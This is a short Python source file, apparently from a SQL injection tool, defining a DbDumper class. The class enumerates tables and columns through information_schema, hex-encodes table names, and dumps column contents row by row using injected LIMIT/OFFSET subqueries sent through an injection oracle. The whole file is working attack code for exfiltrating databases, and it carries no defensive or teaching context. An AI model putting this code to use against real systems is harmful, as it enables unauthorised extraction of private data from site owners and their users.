from string_finder import StringFinder
from tools import SqliEncoder

class DbDumper:
    
    def __init__(self, string_finder):
        self.sf = string_finder

    def tables(self):
        return self.list_query('table_name', 'information_schema.tables')

    def columns(self, table):
        return self.list_query('column_name', 'information_schema.columns', "WHERE table_name = {}".format(SqliEncoder.str_to_hexa(table)))

    def content(self, table, column):
        return self.list_query(column, table)    

    def list_query(self, field, table, where = ''):
        items_ = []
        i = 0        
        while True:
            item = self.sf.read_string("(SELECT {} from {} {} LIMIT 1 OFFSET {})".format(field, table, where, i))
            if item == None:
                break;
            items_.append(item)
            i += 1
        return items_
    
